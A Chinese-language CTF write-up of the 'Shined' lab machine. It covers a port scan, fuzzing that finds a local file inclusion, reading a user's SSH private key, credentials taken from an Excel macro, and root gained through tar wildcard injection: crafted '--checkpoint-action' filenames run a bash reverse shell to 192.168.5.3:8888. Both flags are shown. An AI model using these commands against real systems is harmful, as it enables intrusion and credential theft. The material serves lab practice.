# Shined

2025.03.28 https://thehackerslabs.com/shined/

[video]()

## Ip

192.168.5.39

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

web 只有一个 access.php 不存在 sql 注入，探测一下其他参数吧：

```
ffuf -t 100 -c  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -u 'http://192.168.5.39/access.php?FUZZ=../../../../../etc/hosts' -fs 1849
```

发现 inet 存在 LFI,读取 /etc/passwd 发现用户 cifra ，读取不到 web 日志文件，但是能读取到 cifra 的私钥。

```
curl http://192.168.5.39/access.php?inet=../../../../../home/cifra/.ssh/id_rsa
```

保存，22 上不能登陆，2222 上可以私钥登陆，发现/.dockerenv 在容器中。

发现一个 contabilidad.xlsm，有宏 olevba 就看到一个 leopoldo:snickers 在用这个凭据登陆 22 ssh 端口，成功，拿到 user flag：

```
leopoldo@shined:~$ cat user.txt
73f5b965bd7e817a71b853f44ada19b0
```

./Desktop/scripts/backup.tgz 是一个循环的压缩包，在/tmp 中发现 backup.sh 就是创建 backup.tgz 的脚本，同时发现 backup.tgz 每分钟更新一次，应该是后台计划任务，直接利用 tar 方式提权：

```
cd ~/Desktop/scripts/
printf '#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"\n' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1
```

不知道哪个用户在执行计划任务，先获得个反弹 shell。

1 分钟后拿到 root：

```
root@shined:~# cat root.txt
01d940a42e6a3f5727e2382d9f4f3b87
```
